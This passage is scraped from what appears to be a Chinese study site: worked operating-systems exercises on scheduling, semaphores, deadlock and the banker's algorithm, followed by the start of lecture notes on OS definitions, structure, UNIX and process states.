0.1 1 4:06 1.1 11 4 3:30 0.2 0.6 4:18 0.8 4 2 2:30 0.5 1.8 4:48 2.3 4.6 平均值 1.55 5.15 先来先服务 作业号 提交时间 运行时间 等待时间 完成时间 周转时间 代权周转时间 1 2:00 2.0 0 4:00 2 1 2 2:30 0.5 2 6:30 4 8 3 3:00 0.1 3.5 6:36 3.6 36 4 3:30 0.2 3.1 6:48 3.3 16.5 平均值 3.225 15.375 第三章习题\u003e 第三章习题 # 1. 判断以下命题是否正确，并说明理由。\u003e 1. 判断以下命题是否正确，并说明理由。 # 如果 CPU 正在执行一个 Down 操作的时候，一个最高级中断到来，那么中断处理进程会抢夺 CPU。\n错。Down是原语操作，不可中断。\n临界区是进程执行程序中对临界资源访问的那一段程序代码。\n对。临界区就是在进程中访问临界资源的那一段程序。\n仅当一个进程退出临界区之后，另一个进程才能进入相应的临界区。\n对。临界区是用于访问临界资源的，临界资源必须是互斥访问的。\n进程 A 与进程 B 共享变量 S1，需要互斥；进程 B 与进程 C 共享变量 S2，需要互斥。 从而，进程 A 与进程 C 也必须互斥。 错。互斥没有传递性，进程A与进程C并不共享变量。\n系统处于不安全状态必然导致系统死锁。\n错。死锁一定处于不安全状态，但系统处于不安全状态不一定导致系统死锁。\n一个系统的状态如果不是死锁状态那么就一定是安全状态。\n错。不是死锁状态不代表现在不是不安全状态。\n死锁一定处于不安全状态，但系统处于不安全状态不一定导致系统死锁。\n2. 单项选择题。\u003e 2. 单项选择题。 # 在操作系统中，Down、Up 操作是一种（ ）。\nA、机器指令 B、系统调用命令 C、作业控制命令 D、低级进程通信原语\n进程通信类型包括低级通信和高级通信。 进程通信指进程之间的信息交换，进程同步所交换的信息量少，称为低级通信。\n高级进程通信是指用户可直接利用操作系统所提供的一组通信命令，高效传送大量数据的一种通信方式。\n下列选项中，在用户态执行的是（ ）。\nA、命令解释程序 B、缺页处理程序 C、进程调度程序 D 时钟中断处理程序\n缺页处理程序和时钟中断都属于中断，在核心态执行。\n进程调度属于系统调用，在核心态执行。\n命令解释程序属于命令接口，在用户态执行。\n设与某资源相关联的信号量初值为 3，当前值为 1，若 M 表示该资源的可用个数，N 表示等待该资源的进程数，则 M，N 分别是（ ）。\nA、0，1\tB、1，0 C、1，2 D、2，0\n信号量表示相关资源的当前可用数量\n某计算机系统中有 8 台打印机，有 K 个进程竞争使用，每个进程最多需要 3 台打印 机，该系统可能会发生死锁的 K 的最小值是（ ）。\nA、2 B、3 C、4 D、5\n每个进程3台，不会产生死锁；对于三个进程，可以有两个进程分别获得3台，使其执行完释放后让第三个进程获得3台，所以也不会产生死锁；对于四个进程，假若每个进程各获得2台而同时需要另外一台，产生了死锁，所以产生死锁的最小值是4。\n类似题型(1)：假设现在有P个进程，每个进程最多需要m个资源，并且有r个资源可用。什么样的条件可以保证死锁不会发生 解：如果一个进程有m个资源它就能够结束，不会使自己陷入死锁中。因此最差情况是每个进程有m-1个资源并且需要另外一个资源。如果留下有一个资源可用，那么其中某个进程就能够结束并释放它的所有资源．使其它进程也能够结束。所以避免死锁的条件是： r≥p(m-1)+1。 由此条件解上题：r=8，m=3，带入公式得：2p≤7。即当P小于等于3时才可保证死锁不会发生，所以可能会产生死锁的最小值是4。\n类似题型(2)：某系统中有3个并发进程，都需要同类资源4个，试问该系统不会发生死锁的最少资源数是多少 解：带入上述条件公式：r≥3*(4-1)+1=10。所以答案为10个。\n3. 填空题\u003e 3. 填空题 # 设系统有 10 个并发进程通过 Down、Up 操作原语共享同一临界资源，若该临界资源 互斥信号量为 Mutex，初值设置为 1，则 Mutex 的值域为（-9,1）。\n有m 个进程共享同一临界资源，若使用信号量机制实现对一临界资源的互斥访问，则信号量的变化范围是(A )。 A.1 至–(m-1) B.1 至m-1 C.1 至–m D.1 至m\n引起进程相互制约的 2 类原因是：直接制约 和 间接制约。\n解决临界区问题的一个必要条件是各个进程对于临界资源必须互斥使用，这些只由对临界资源的争用而引起的进程间的关系，构成了进程间的间接制约关系；（进程异步）\n相对应地，由于必须互相合作而呈现的直接的协同关系，则构成了进程间的直接制约关系。（进程同步）\n为实现消息缓冲通信，在 PCB 中应增加 mq、mutex 和 sm 三个数据项。\n进程通信有直接通信方式和间接通信方式，邮箱机制是一种 间接通信方式。\n邮箱机制是消息传递系统的一种，而且是一种间接通信方式。\n当且仅当 S 状态的资源分配图是 不可化简的，S 为死锁状态。\n对待死锁，一般应考虑死锁的预防、避免、检测和清除四个问题。典型的银行家算法 是属于避免 ，破坏循环等待条件是属于 预防，而抢占资源是 清除 的基本方法。\n4. 什么是 Bernstein 条件？若并发执行的程序不满足 Bernstein 条件可能会失去哪些性质？\u003e 4. 什么是 Bernstein 条件？若并发执行的程序不满足 Bernstein 条件可能会失去哪些性质？ # Bernstein 条件是进程的执行与时间无关的一个充分条件，而非必要条件。\nBernstein 条件指出：如果并发执行的各程序段中语句或指令满足 Bernstein 条件，那么并发执行不会对执行结果的封闭性和可再现性产生影响。\n如果不满足，则程序失去封闭性和可再现性\n5. 什么是信号量？什么是信号量的 Down、Up 操作？如何利用信号量这两个操作来实施进程间的通信？\u003e 5. 什么是信号量？什么是信号量的 Down、Up 操作？如何利用信号量这两个操作来实施进程间的通信？ # 信号量就是一种特殊的整型变量，该整型变量一般被用于描述资源的个数，因此一个信号量通常被初始化为一个非负整数。\nDown、Up 操作是低级进程通信原语，对信号量执行减和加的操作，对应于资源的分配和释放。\n每个进程各自有不同的用户地址空间,任何一个进程的全局变量在另一个进程中都看不到，所以进程之间要交换数据必须通过内核,在内核中开辟一块缓冲区,进程1把数据从用户空间拷到内核缓冲区,进程2再从内核缓冲区把数据读走,内核提供的这种机制称为进程间通信机制。\n信号量用来管理临界资源的。它本身只是一种外部资源的标识，不具有数据交换功能，而是通过控制其他的通信资源实现进程间通信。\n就是两个进程共享信号量s，一旦其中一个进程执行了P(s)操作，它将得到信号量，并可以进入临界区，使s减1。而第二个进程将被阻止进入临界区，因为当它试图执行P(s)时，s为0，它会被挂起以等待第一个进程离开临界区域并执行V(s)释放信号量，这时第二个进程就被唤醒恢复执行了。\n6. 举例说明若 Down、Up 操作不实现为原语，就不能实现对临界区的互斥。\u003e 6. 举例说明若 Down、Up 操作不实现为原语，就不能实现对临界区的互斥。 # 如果进程P1在执行Down(s)时被中断，P2上处理机，那么P2就会让s=0，并顺利进入临界区，在P2访问临界区还没结束时，P1又上处理机，而此时P1将会继续执行Down操作，然后也顺利进入临界区，此时的临界区就有两个进程在同时运行，因此若 Down、Up 操作不实现为原语，就不能实现对临界区的互斥。\n8. 说明同步、互斥的区别与联系。\u003e 8. 说明同步、互斥的区别与联系。 # 区别：\n相互互斥的进程在逻辑上是无关的，不具有时间次序的特征，他们是因为对临界资源的争用而产生了间接制约的关系，而互斥便是解决进程间间接制约的手段；\n相互同步的进程，具有时间次序的特征，是相互合作而呈现的直接制约关系，同步便是解决进程间直接制约的手段\n联系：\n互斥是一种特殊的同步。因为同步的进程在执行时间上必须基于某个条件按一定的顺序协调进行，互斥的进程也必须基于某个条件（即对共享资源的互斥访问）按一定的顺序协调进行，只不过是互斥的进程的这种顺序不是固定的，而是可以任意的（只要满足互斥）。 10. 请解释操作系统中“管道”和“管程”这两个名词。\u003e 10. 请解释操作系统中“管道”和“管程”这两个名词。 # 管道，是指能够连接一个写进程和一个读进程、专门用于进程之间的数据通信的共享文件。\n管程，是关于共享资源的数据结构及一组针对该资源的操作过程所构成的软件模块。\n12. 请用Down、Up 操作作为同步机制描述对应于计算进程和打印进程的程序。\u003e 12. 请用Down、Up 操作作为同步机制描述对应于计算进程和打印进程的程序。 # 设有 N 个计算进程和 M 个打印进程共享同一个缓冲区，缓冲区的长度为 8。各计算进程不断地把计算得到的结果送入缓冲区，各打印进程不断地从缓冲区取数并打印。要求，既不漏打，也不重复打印任何一个结果，并且，为了提高工作效率，计算进程在使用缓冲区的同时，运行打印进程从缓冲区中取数，反之亦然。请用Down、Up 操作作为同步机制描述对应于计算进程和打印进程的程序。\nint empty = 8; int full = 0; computer(){ while(1){ prepare a num;//生产数据 P(empty);//申请空闲缓存空间 add num to buffer;//将数据放入缓冲区 V(full);//满缓冲区加一 } } print(){ while(1){ P(full); remove a num from buffer; V(empty); print a num; } } 20. 死锁产生的四个必要条件是什么？用于保证系统不会产生死锁的方法有哪些？\u003e 20. 死锁产生的四个必要条件是什么？用于保证系统不会产生死锁的方法有哪些？ # 互斥条件：一个资源每次只能被一个进程使用，即在一段时间内某资源仅为一个进程所占有，此时若有其他进程请求该资源，则请求进程只能等待 请求与保持条件：进程已经保持了至少一个资源，但又提出了新的资源请求时，该资源已被其他进程占有，此时请求进程被阻塞，但对自己已获得的资源保持不放 不可剥夺条件:进程所获得的资源在未使用完毕之前，不能被其他进程强行夺走，即只能由获得该资源的进程自己来释放（只能是主动释放) 循环等待条件: 若干进程间形成首尾相接循环等待资源的关系 死锁检测与死锁恢复 死锁预防，破坏4个必要条件 死锁避免，银行家算法 21. 简述“死锁”与“饿死”。\u003e 21. 简述“死锁”与“饿死”。 # 二者都是由于资源的争夺和资源的分配策略而引起的\n不同点：\n①从进程状态考虑，死锁进程都处于等待态（等待某一不可被剥夺资源被释放）,饿死进程可能处于忙式等待(就绪队列上等待可剥夺处理机资源)。（忙式等待：不进入等待状态的等待实际状态为”运行“或者”就绪“忙式等待空耗处理器资源因而是低效的,进程无法向前推进等待某一事件，但不主动放弃处理器而是不断循环检测资源是否可用）。\n②死锁进程等待永远不会被释放的资源，饿死进程等待会被释放但却不会分配给自己的资源。\n③死锁一定发生了循环等待，而饿死则不然，这也表明通过资源分配图可以检测死锁存在与否，但不能检测是否有进程饿死。\n④死锁一定涉及多个进程·，而饥饿或被饿死的进程可能只有一个。\n23. 某系统有同类资源 m 个，供 n 个进程使用；如果每个进程对资源的最大需求量为 k，\u003e 23. 某系统有同类资源 m 个，供 n 个进程使用；如果每个进程对资源的最大需求量为 k， # 为使系统不发生死锁，k 的最大值为多少？\n如果一个进程有k个资源它就能够结束，不会使自己陷入死锁中。因此最差情况是每个进程有k-1个资源并且需要另外一个资源。如果留下有一个资源可用，那么其中某个进程就能够结束并释放它的所有资源．使其它进程也能够结束。\n因此，总共只有m个，要分给n个进程，最差的情况是每个进程都有k-1个资源并需要另外的资源，因此m \u0026gt;= n(k-1) + 1，k\u0026lt;=(m-1)/n+1\n按（1）的结果，当 n=3，m 分别取值 2、3、4 时，对应的 k 值是多少，就可以使系统不发生死锁？\n​\tn=3,m=2\tk\u0026lt;1/3+1\tk=1\n​\tn=3,m=3\tk\u0026lt;2/3+1\tk=1\n​\tn=3,m=4\tk\u0026lt;3/3+1\tk=2\n26. 请描述用于死锁避免的银行家算法的主要思想并列出其需要使用的数据结构，并简单分析这种算法能解决实际问题中的死锁吗？\u003e 26. 请描述用于死锁避免的银行家算法的主要思想并列出其需要使用的数据结构，并简单分析这种算法能解决实际问题中的死锁吗？ # 主要思想:\n允许进程动态地申请资源，但在系统在进行资源分配之前，应先计算此次资源分配的安全性，若此次分配会导致系统进入不安全状态，则将资源分配给进程；否则，令进程等待。\n数据结构共有七种：\n向量 Available = ( V1, V2, …, Vm ) 用于表示系统初始可供使用的资源总数； 向量 Work = ( W1, W2, …, Wm ) 用于表示系统当前可供使用的资源总数，刚开始初始化为 Available 向量； 向量 Finish = ( F1, F2, …, Fn ) 用于表示 n 个进程被标记的情况，初始值为false，当某个进程获得所需的全部资源，并能释放全部资源时标记为ture； 矩阵Max[Mij]，其中矩阵中的元素 Mij表示第 i 号进程对第 j 类资源 的总需求数目； 矩阵Allocation[Aij]，其中矩阵中的元素 Aij 表示第 i 号进程当前分配的第 j 类资源的数目； 矩阵Need[Nij]其中矩阵中的元素 Nij 表示第 i 号进程还需要的第 j 类资源的数目； 向量Request = ( R1, R2, …, Rm ) 用于表示某个进程的某次资源请求，Ri表示该次请求的第 i 类资源的数量。 这种算法能解决实际问题中的死锁吗？\n不能。\n因为假象条件太过理想，比如：预先知道进程需要的最大资源数。\n28. 某系统有 4 类资源，有 5 个并发进程。各进程的最大资源请求和已分配的资源矩阵以及当前资源剩余向量如下表所示：\u003e 28. 某系统有 4 类资源，有 5 个并发进程。各进程的最大资源请求和已分配的资源矩阵以及当前资源剩余向量如下表所示： # 按银行家算法回答：\n计算需求矩阵 Need。\nNeed = Max - Allocation\nP0 0 0 0 0 P1 0 7 5 0 P2 1 0 0 2 P3 0 0 2 0 P4 0 6 4 2 系统当前处于安全状态吗？\nP0可释放，回收资源 0 0 1 2，则剩余资源1,2,4,6\n分配给P2 分配给P3 回收资源2,3,5,6 0,6,5,2 剩余资源3,5,9,12 1,8,9,8 剩余P1，P4 剩余P1，P4，对比剩余资源，可满足 R2类资源剩余5 分配给P1 分配给P4 不满足P1和P4 回收0,7,5,0 回收0,6,4,2 不安全 剩余1,15,14,8 剩余1,14,13,10 分配给P4 分配给P1 安全序列 0,3,1,4 或者 0,3,4,1\n进程 P2 此时发出请求向量 Request(0, 3, 2, 0)，系统能立即满足吗？\n不能，P0释放后还剩余资源1,2,4,6，不满足P2的需求。\n","date":"2022-01-07","permalink":"/docs/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%A0%E9%A2%98/","section":"Docs","summary":"第一章 习题\u003e 第一章 习题 # 1. 判断以下命题是否正确，并说明理由。\u003e 1. 判断以下命题是否正确，并说明理由。 # 设计操作系统的主要目标是什么？\n方便性：使计算机更易于用户使用。 有效性：以有效的方式管理计算机系统的资源，合理地组织计算机的工作流程， 以防止对计算机资源的不当或错误使用。这是操作系统可用的关键因素。 可扩展性：为用户的的开发搭建一个平台，允许修改、并引进新的功能。 操作系统为计算机上所有软件的性能提高提供了平台，另外，操作系统提供了一系列功能用以支持用户程序的运行。 操作系统的基本功能是什么?\n操作系统是用户和计算机硬件之间的接口。 操作系统是计算机系统资源的管理者。 操作系统用作扩充机器，使得裸机功能更强、更方便使用。 多道批处理系统形成和发展的主要动力是什么？\n计算机体系的不断发展，需要不断提高计算机资源的利用率和系统吞吐量的需要。\n推动分时操作系统形成和发展的主要动力是什么？\n为了满足用户对人机交互的需求，出现了分时系统。\n操作系统的结构大致可分为哪几类？UNIX 的结构有什么特点？\n三类：整体、分层、微内核\nUNIX是分层结构\n优点 增加了系统的可读性和可适应性，简化了系统的设计和实现。 易于调试、修改、扩充、维护和保证正确性。 缺点 操作系统的效率不高。 层的定义较为困难。 第二章 习题\u003e 第二章 习题 # 1.","title":"操作系统习题"},{"content":"1. 绪论\u003e 1. 绪论 # 1.1 操作系统概述\u003e 1.1 操作系统概述 # 1.1.1 操作系统的定义\u003e 1.1.1 操作系统的定义 # Operating System 是指控制和管理整个计算机系统的硬件与软件资源，合理地组织和调度计算机的工作和资源的分配，进而为用户和其他软件提供方便接口与环境的程序集合。\n操作系统是计算机系统中最基本的系统软件。\n1.1.2 操作系统的功能\u003e 1.1.2 操作系统的功能 # 操作系统是用户和计算机硬件之间的接口。\n命令接口\n联机命令接口（交互式命令接口）\n适用于分时和实时操作系统\n脱机命令接口（批处理命令接口）\n适用于批处理系统\n程序接口（系统调用、广义指令）\n用户通过在程序中使用这些系统调用来请求操作系统的服务\n如：使用各种外部设备、申请分配和回收内存等\n例：图形接口不是操作系统的一部分，但图形接口所调用的系统命令是操作系统的一部分\n操作系统是计算机系统资源的管理者。\n处理机管理（进程管理）\n存储器管理\n文件管理\n设备管理\n操作系统用作扩充机器\n操作系统使得裸机功能更强、更方便使用 因此，覆盖了软件的机器称为扩充机器或虚拟机 1.1.3 操作系统的目的\u003e 1.1.3 操作系统的目的 # 方便性：使计算机更易于用户使用。 有效性：以有效的方式管理计算机系统的资源，合理地组织计算机的工作流程， 以防止对计算机资源的不当或错误使用。这是操作系统可用的关键因素。 可扩展性：为用户的的开发搭建一个平台，允许修改、并引进新的功能。 操作系统为计算机上所有软件的性能提高提供了平台，另外，操作系统提供了一系列功能用以支持用户程序的运行。 1.2 操作系统的发展过程\u003e 1.2 操作系统的发展过程 # 手工操作（无操作系统）\n批处理阶段（开始出现操作系统）\n单道批\n多道批\n分时操作系统（交互性强）\n实时操作系统（及时性、可靠性、交互性不如分时）\n网络操作系统（服务于计算机网络，集中式控制）\n分布式操作系统（建立在网络操作系统上，分布控制）\n个人计算机\n1.3 操作系统的结构\u003e 1.3 操作系统的结构 # 1.3.1 整体\u003e 1.3.1 整体 # 例如 CP/M 和 MS-DOS，以及原始的 UNIX 操作系统。MS-DOS 系统设计的目标是利用最小的空间提供最多的功能\n优点 由于整体结构的操作系统的应用程序和底层硬件之间没有太多接口，所以这种类型的 操作系统结构紧密，接口简单直接，系统效率较高，具有良好的性能。 缺点 这种结构 的模块独立性差，易形成复杂的调用关系，使得增强或维护这样的操作系统很困难，修改 其中的一个模块将会影响到其他模块。 1.3.2 分层\u003e 1.3.2 分层 # 分层操作系统的例子有 VAX/VMS 和 UNIX 等。\n由于增强或维护整体结构的操作系统所遇到的问题，导致了分层操作系统的出现。\n层次结构正是从这点出发，力求使模块间调用的无序性变为有序性。\n优点 增加了系统的可读性和可适应性，简化了系统的设计和实现。 易于调试、修改、扩充、维护和保证正确性。 缺点 操作系统的效率不高。由于所有请求在到达硬件之前要经过很多层，每一层所 产生的系统开销会使得操作系统的效率较低。 层的定义较为困难。在设计层次结构时，各系统对划分层次的数目有不同的看法，有时很难决定特定层中应该包含的内容。 1.3.3 微内核\u003e 1.3.3 微内核 # 采用微内核的思想开发的操作系统有：Minix、Tru64 UNIX、L4、QNX 等。\n在分层操作系统中，设计者要确定内核—用户的边界，所有的层都在内核中。然而， 随着操作系统的开发人员开始给系统添加越来越多的特性，使得内核变得越来越大且难于管理。\n微内核（micro-kernel）设计的思想是：将操作系统划分成小的、定义良好的模块。\n微内核通常只提供了最基本的操作系统功能，如进程管理、通信原语和低级内存管理。\n在内核外部实现的系统程序或用户级程序提供了其余的操作系统服务，这些程序被称为服务器。应用程序和不同的服务器通过传递给微内核的消息进行通信，微内核验证消息，然后在操作系统的不同模块之间传送消息，并允许对硬件进行访问。例如：如果客户程序希望访问一个文件，那么它必须与文件服务器进行交互。客户程序和服务器不会直接交互，而是通过微内核的消息传递来进行通信。\n优点\n良好的扩充性：通过添加服务器就可以简单地增加新的服务种类而不需要修改 内核。 可靠性好：如果某个特定的服务器出现问题，那么可以重新配置和启动该服务 器，而不必重新启动整个操作系统。 高灵活性：由于内核和服务器之间是分隔的，所以使用单个微内核就可以构造 出满足各种特定环境的不同的操作系统。例如：Mac OS X、Tru64 UNIX 以及某些变种的 Linux 都可以在 Mach 微内核上实现。 可移植性强：由于微内核可以直接和底层硬件进行交互，所以可以很方便地将 操作系统移植到各个不同的平台上。 1.4 操作系统的特征\u003e 1.4 操作系统的特征 # 1.4.1 并发性（Concurrency）\u003e 1.4.1 并发性（Concurrency） # 宏观多道程序同时执行，微观交替执行，对有限物理资源进行多用户共享以提高效率。\n1.4.2 共享性（Sharing）\u003e 1.4.2 共享性（Sharing） # 互斥访问，同时访问\n并发和共享相互依存\n1.4.3 异步性（Asynchronism）\u003e 1.4.3 异步性（Asynchronism） # 在操作系统控制下多个进程的执行次序和每个进程的执行时间是不确定的。\n1.4.4 虚拟性（virtuality）\u003e 1.4.4 虚拟性（virtuality） # 虚拟指把一个物理上的实体变为若干逻辑上的对应物。\n虚拟技术可分为：时分复用和空分复用。\n如：虚拟处理器、虚拟存储器、虚拟内存、虚拟外部设备。\n假脱机技术 **SPOOLing ** (Simultaneous Peripheral Operations On-Line) 技术可把物理上的一台独占设备变成逻辑上的多台虚拟设备；\n若有进程要求对它打印输出时，SPOOLing系统并不是将这台打印机直接分配给进程，而是在共享设备（磁盘或磁鼓）上的输出SPOOLing存储区中为其分配一块存储空间，进程的输出数据以文件形式存放于此。在SPOOLing 系统中，实际上并没有为任何进程分配，而只是在输入井和输出井中，为进程分配一存储区和建立一张I/O请求表。这样，便把独占设备改造为共享设备。\n题目\u003e 题目 # 计算机开机后，操作系统最终会被加载到 RAM BIOS（Basic Input Output System）：它是一组固化到计算机内主板上一个ROM芯片上的程序，它保存着计算机最重要的基本输入输出的程序、开机后自检程序和系统自启动程序，它可从CMOS中读写系统设置的具体信息。\nROM（Read-Only Memory）：只读存储器ROM，所存数据通常是装入整机前写入的，整机工作过程中只能读出。\nEPROM：可擦除可编程只读存储器，一旦编程完成后，EPROM只能用强紫外线照射来擦除。\nRAM （Random Access Memory）：随机存取存储器，也叫主存，是与 CPU直接交换数据的内部存储器。RAM在计算机和数字系统中用来暂时存储程序、数据和中间结果。\n1.5 UNIX 系统简介\u003e 1.5 UNIX 系统简介 # UNIX 操作系统是一个多用户分时操作系统。\n由于它的绝大部分代码是用 C 语言编制 的，故可移植性极好。\n1.5.1 UNIX综述\u003e 1.5.1 UNIX综述 # UNIX特点\n内核简洁，可常驻内存，保证系统高效运行，同时可以开发大量核外程序为用户服务。\n用C语言编写，具有良好的可移植性。\n树形结构文件系统\n搜索速度快、安全性、保密性、可维护性；\n文件系统可装卸，用户可以同时使用多个文件系统；\n外设和文件统一看成文件，在用户面前，操作方式相同。\nI/O重定向和管道，灵活性高\n通过 I/O 重定向，可以指定命令或程序从何处得到输入和将结果送到何处去，从而改变了默认的输入源位置和输出目标位置。\n管道让一个命令或程序的输出成为另一个命令或程序的输入。\n良好的用户接口，提供shell和系统调用\n开放式的操作系统\n允许用户自己编写工具和程序\n提供TCP/IP协议，可实现网络互联\n开发环境优良\n提供有大量的软件开发工具，如源代码控 制系统（SCCS）、词法分析器自动生成器（Lex）、优化 C 编译器和源代码调试工具等。\n丰富的使用程序，软件厂商支持\nUNIX的分层体系结构\n1.5.2 UNIX内核功能\u003e 1.5.2 UNIX内核功能 # UNIX内核结构\n分为三级：用户级、核心级、硬件级\nUNIX内核功能简述\n文件子系统\n(1) 空闲文件存储空间的管理；\n(2) 为文件分配文件存储空间；\n(3) 回收文件释放的文件存储空间；\n(4) 文件存取控制；\n(5) 搜索文件；\n(6) 为用户提供系统调用服务。\nUNIX 文件分为四类：正规文件、目录文件、设备文件和管道文件。\n正规文件：存放程序、数据等（无格式的字符流文件，可按照自己的格式来解释文件）\n目录文件：存放文件系统中各个目录信息的文件（字符流式文件，系统将其解释为文件目录，所有的目录文件构成整个 UNIX 文件系统的树状结构）\n设备文件：代表一个物理设备，用户可以按处理正规文件的方式对其进行处理，但设备文件除了有关文件管理的信息外，并不占据实际的物理存储块\n管道文件：用来存放管道数据。\n进程控制子系统\n进程是一个具有独立功能的程序对其所处理的数据在处理机上的执行过程。\n(1) 进程的创建；\n(2) 进程的调度；\n(3) 进程间的通信；\n(4) 进程间的同步控制。\n设备管理子系统\n完成进程和外设间数据交换的功能\n存储管理子系统\n(1) 管理内存的空闲空间；\n(2) 对交换区空间（一般在磁盘上）进行管理；\n(3) 对虚拟存储空间进行管理。\n物理内存空间是十分有限的。为了充分提高宝贵的内存的使用效率，UNIX 后期版本 只把进程的一小部分程序和数据放在内存中，而把剩余的程序和数据放在外存，然后采用 交换和请求调页的存储管理策略实现对内存的管理，提供用户比物理内存大得多的虚拟地 址空间。UNIX 的早期版本仅采用交换技术进行内存管理。\n交换技术：就是指当内存满了以后，就将一个程序从内存换出，将另一个程序放入内存，换出的内存数据保存在硬盘上，当该程序再次被换入的时候，就将硬盘上的数据拷贝到内存。\n2.处理机管理\u003e 2.处理机管理 # 对处理机的管理就是对进程的管理，处理机分配和调度的对象大都是以进程为单位\n传统的进程也可以看成是只有一个线程的进程\n2.1 多道程序设计\u003e 2.1 多道程序设计 # 所谓多道程序设计是指允许让多个计算问题同时装入一个计算机系统的主存储器，并允许它们共享资源、并发执行的程序设计技术。\n2.1.1 单道程序的顺序执行\u003e 2.1.1 单道程序的顺序执行 # 程序的顺序执行有两个特点：\n封闭性：程序在运行时独占资源 可再现性：初始条件相同，则在何时执行结果都相同 2.1.2 多道程序的并发执行\u003e 2.1.2 多道程序的并发执行 # 多道程序的特点：\n并发性：宏观上同时运行，微观上顺序执行 资源共享性 并发的程序相互制约 不确定性 2.2 进程的基本概念\u003e 2.2 进程的基本概念 # 程序是完成某一特定功能的指令序列，是一个静态的概念；而处理机的执行活动是程序的执行过程，是一个动态的概念。同一个程序，在一段时间内，可以多次被执行，而且是并发执行，这样这些并发执行的动态过程也无法简单地用程序加以区别。可见，程序这个静态的概念无法正确描述程序的动态执行情况，但是进程能很好地描述程序的并发执行， 这些是引入进程这个概念最重要的原因。\n2.2.1 进程的定义\u003e 2.2.1 进程的定义 # 进程=程序+数据+执行\n进程实体=程序段+相关的数据段+PCB\n进程控制块（Process Control Block，简称 PCB），用于记录有关该进程的资料\n进程分为系统进程和用户进程两类\nWindows 操作系统在初始化后，将自动产生诸如SMSS（对话管理）、LSASS（安全管理）、WINLOGON（登陆管理）、 explore（Windows 壳）等系统进程，之后用户可以创建新的用户进程。\n2.2.2 进程的属性\u003e 2.2.2 进程的属性 # 动态性。 进程动态产生，动态执行，动态消亡；\n进程有生命周期，而且在其生命周期内，进程的状态是动态变化的。\n并发性。 这是指多个进程实体可同存于主存之中，且能在一个时间段内宏观上同时运行。\n独立性。 这是指进程实体是一个能够独立运行、独立分配资源和独立接收调度的基本单位，而且它有自己的程序计数器和内部状态。\n异步性。 这是指每个进程按各自独立的、不可预知的速度向前推进。\n交往性。 这是指一个进程在运行过程中可能会与其他进程发生直接的或者间接的相互作用。\n进程之间可能要互斥地使用某些资源，相关进程之间可能需要必要的同步和通信等。\n2.2.3进程与程序的关系\u003e 2.2.3进程与程序的关系 # 考虑动态性 进程是程序的一次执行过程，进程是一个动态概念；\n而程序是完成某个特定功能的指令的有序序列，即程序是一个静态概念。\n程序是代码的集合，而进程是程序的执行。\n程序可以作为一种软件资源长期保存，可以被复制，可以在不同的计算机上运行；\n而进程，是有生命周期的，它动态地被创建，并被调度执行后消亡。\n考虑并发性 进程具有并发特征，而程序没有。由于一个进程可以与其他进程并发执行，即进程具有并发性；而程序并不反映执行过程，所以不具有并发特征。\n考虑资源 进程是系统进行资源分配和调度的一个独立单位，即资源分配是以进程为单位的，而不是以程序为单位的。\n考虑结构 程序的组成是代码，而进程实体的组成包括：程序、数据和 PCB。\n考虑生成性 进程可以生成其他进程，而程序则无法生成新的程序。\n考虑对应关系 一个程序多次执行可以对应多个进程；通过调用关系，一个进程也可以包括多个程序。\n2.3 进程的状态及转换\u003e 2.3 进程的状态及转换 # 2.3.1 进程的基本状态及转换\u003e 2.3.1 进程的基本状态及转换 # 共五种状态（三个基本状态） 初始态：进程刚被创建时，由于还没正式提交给操作系统的处理机调度程序对其进行管理，因此只能处于一个特殊的初始状态； 终止态：进程在执行结束后，将退出执行而被终止，此时也不受处理机调度程序的管理，即进程处于另一个特殊的状态——终止状态； 执行态：进程在处理机上执行，即处于执行状态； 就绪态：已经具备执行所需的所有必要条件，只要占用 CPU 就可以执行，但由于该进程使用CPU的时间太长，为了公平，把CPU让给别的进程使用； 阻塞态：由于进程在运行过程中执行了某种阻塞操作（如读写），此时该进程用不到CPU，便将CPU交给别的进程使用，即进入了阻塞态。 每个进程在执行过程中（不包含初始状态和终止状态），任何时刻必须处在三个基本状态之一，而且只能处在三个基本状态之一（不能同时处于两个状态）。\n进程的状态是如何转换的呢？\n初始态变为就绪态：当操作系统完成对进程创建的必要操作后，相应的系统进程将进程的状态转换为就绪状态。 就绪态变为执行态：进程被处理机调度选中而获得处理机时，进程由就绪状态变为执行状态。 执行态变为阻塞态：这是由于执行进程自己的原因造成的，执行进程等待某个事件发生或者等待使用某种资源，此时进程无法继续执行直到等待的条件满足，这种情况下， 进程由执行态变为阻塞态。 阻塞态变为就绪态：事件完成，即资源得到满足或者等待的事件已经发生，此时进程由阻塞态变为就绪态，等待再次被处理机调度选中执行。 执行态变为就绪态：处于执行态的进程被剥夺处理机时引起的，通常与调度策略有关，比如运行时间片已到或者出现更高优先级的进程等，此时，进程由执行态变为就绪态。 执行态变为终止态：当一个进程完成任务自然结束，或是出现了无法克服的错误， 或是被操作系统或其他进程所终结时，进程由执行态变为终止态。 2.3.2 具有挂起功能的进程状态及转换\u003e 2.3.2 具有挂起功能的进程状态及转换 # 随着系统的运行，更多的进程被不断创建，当系统资源不能满足进程运行的需求时， 系统须把某些进程对换到磁盘中，暂时不让其参与进程调度，以达到平滑系统负荷的目的， 这个过程称为“挂起”。\n引起进程挂起的原因： 运行需要：内存中的进程均处于阻塞态，而处理机空闲，此时需要把一些阻塞进程挂起（即对换出去），以腾出内存空间装入就绪进程，使之运行； 调节负荷的需要：由于进程竞争资源而导致系统的资源不足或负荷过重，此时，需要挂起部分不太重要的进程，以调节系统负荷，以保证系统的正常运行（需要说明的是： 系统也可能把一些定期执行的进程，如监控程序、审计程序、记账程序等对换出去，以减轻系统的负荷）； 用户请求：用户请求挂起自己的进程，以便分析其执行情况，或根据中间执行情况 进行其他处理； 父进程要求：父进程可以要求挂起自己的某个子进程，以便对该子进程进行考察、 分析或修改，或者协调各个子进程的运行； 操作系统需要：第一，当系统出现故障或某些功能受到破坏时，系统需要挂起某些进程以检测和排除故障；第二，有时系统因需要检查运行过程中的资源使用情况而挂起某些进程。 新增的两个状态： 静止就绪态：表明进程具备运行条件，但目前进程不在主存中而是处于被挂起状态，只有当它被对换到主存中才能被调度执行； 静止阻塞态：表明进程在等待某一事件，且进程不在主存中。 具有挂起功能的进程状态转换图 状态转换详解\n活跃阻塞态挂起变为静止阻塞态： 若当前不存在活跃就绪进程，则至少有一个活跃阻塞进程将被对换出去成为静止阻塞进程; 操作系统依据当前的资源状况和性能要求，可以将某些活跃阻塞进程对换出去成为静止阻塞进程； 静止阻塞态激活变为活跃阻塞态： 操作系统已经得知导致进程阻塞的事件即将结束； 内存中已经有了一大块自由空间； 